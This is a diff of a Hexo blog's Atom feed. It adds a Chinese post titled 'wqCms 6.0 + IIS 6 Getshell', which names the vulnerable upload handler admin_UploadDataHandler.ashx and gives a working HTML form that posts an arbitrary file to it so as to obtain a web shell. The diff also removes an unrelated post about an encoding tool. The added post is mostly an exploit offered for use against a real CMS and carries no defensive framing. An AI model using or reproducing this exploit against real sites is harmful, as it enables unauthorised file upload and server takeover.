@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://hacktech.cn/"/>
-  <updated>2017-03-03T14:36:52.149Z</updated>
+  <updated>2017-03-03T14:42:00.121Z</updated>
   <id>http://hacktech.cn/</id>
   
   <author>
@@ -14,6 +14,34 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>wqCms 6.0 + IIS 6 Getshell</title>
+    <link href="http://hacktech.cn/2017/02/22/wqCms-6-0-IIS-6-Getshell/"/>
+    <id>http://hacktech.cn/2017/02/22/wqCms-6-0-IIS-6-Getshell/</id>
+    <published>2017-02-22T13:20:55.000Z</published>
+    <updated>2017-03-03T14:42:00.121Z</updated>
+    
+    <content type="html"><![CDATA[<p>2017-02-15发布</p>
+<h1 id="一、漏洞利用点"><a href="#一、漏洞利用点" class="headerlink" title="一、漏洞利用点"></a>一、漏洞利用点</h1><p>漏洞文件:admin_UploadDataHandler.ashx 自定义构造上传点<br><a id="more"></a></p>
+<h1 id="二、hack-it"><a href="#二、hack-it" class="headerlink" title="二、hack it"></a>二、hack it</h1><p><img src="https://ooo.0o0.ooo/2017/02/22/58ad9095a4fe5.jpg" alt="77e968abd5e5cb3e2c4cdfbe620568fa.jpg"><br><img src="https://ooo.0o0.ooo/2017/02/22/58ad8ebcee2cf.jpg" alt="7281e4d1334393ddcc1c4926ad0065a8.jpg"></p>
+<h1 id="三、POC"><a href="#三、POC" class="headerlink" title="三、POC"></a>三、POC</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://127.0.0.1/admin_UploadDataHandler.ashx"</span> <span class="attr">method</span>=<span class="string">"POST"</span><span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></div><div class="line">            <span class="tag">&lt;<span class="name">input</span>  <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"uploadify"</span> /&gt;</span></div><div class="line">            <span class="tag">&lt;<span class="name">input</span>  <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"saveFile"</span> <span class="attr">value</span>=<span class="string">"admin"</span> /&gt;</span></div><div class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"Upload"</span> <span class="attr">value</span>=<span class="string">"Submit Query"</span> /&gt;</span></div><div class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure>
+<p>转自群友论坛文章<a href="http://loner.fm/article.php?id=24236" target="_blank" rel="external">wobushou</a></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;2017-02-15发布&lt;/p&gt;
+&lt;h1 id=&quot;一、漏洞利用点&quot;&gt;&lt;a href=&quot;#一、漏洞利用点&quot; class=&quot;headerlink&quot; title=&quot;一、漏洞利用点&quot;&gt;&lt;/a&gt;一、漏洞利用点&lt;/h1&gt;&lt;p&gt;漏洞文件:admin_UploadDataHandler.ashx 自定义构造上传点&lt;br&gt;
+    
+    </summary>
+    
+      <category term="Hacker" scheme="http://hacktech.cn/categories/Hacker/"/>
+    
+    
+      <category term="Hacker" scheme="http://hacktech.cn/tags/Hacker/"/>
+    
+  </entry>
   
   <entry>
     <title>otunnel：一个和lcx差不多的端口转发的工具</title>
@@ -1286,42 +1314,6 @@
     
     
       <category term="Python" scheme="http://hacktech.cn/tags/Python/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>编码转换工具</title>
-    <link href="http://hacktech.cn/2016/06/09/%E7%BC%96%E7%A0%81%E8%BD%AC%E6%8D%A2%E5%B7%A5%E5%85%B7/"/>
-    <id>http://hacktech.cn/2016/06/09/编码转换工具/</id>
-    <published>2016-06-09T14:41:55.000Z</published>
-    <updated>2016-10-29T06:59:46.298Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>闲来无事，写了款编码转换工具</strong></p>
-<p><strong>以我的审美来看，界面应该算美丽</strong></p>
-<hr>
-<p><strong>截图 :</strong></p>
-<hr>
-<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/%E7%BC%96%E7%A0%81%E8%BD%AC%E6%8D%A2%E5%B7%A5%E5%85%B7.png" alt="Akkuman"><br><a id="more"></a></p>
-<h1 id="下载地址："><a href="#下载地址：" class="headerlink" title="下载地址："></a>下载地址：</h1><p><a href="http://cloud.189.cn/t/yueaMb7VnmAb" target="_blank" rel="external"><strong>编码转换工具</strong></a></p>
-<p><em>转载请注明出处</em></p>
-<p><em>作者博客 53xiaoshou.com | hacktech.cn</em></p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;&lt;strong&gt;闲来无事，写了款编码转换工具&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;以我的审美来看，界面应该算美丽&lt;/strong&gt;&lt;/p&gt;
-&lt;hr&gt;
-&lt;p&gt;&lt;strong&gt;截图 :&lt;/strong&gt;&lt;/p&gt;
-&lt;hr&gt;
-&lt;p&gt;&lt;img src=&quot;http://7xusrl.com1.z0.glb.clouddn.com/%E7%BC%96%E7%A0%81%E8%BD%AC%E6%8D%A2%E5%B7%A5%E5%85%B7.png&quot; alt=&quot;Akkuman&quot;&gt;&lt;br&gt;
-    
-    </summary>
-    
-      <category term="Tools" scheme="http://hacktech.cn/categories/Tools/"/>
-    
-    
-      <category term="Tools" scheme="http://hacktech.cn/tags/Tools/"/>
     
   </entry>
   
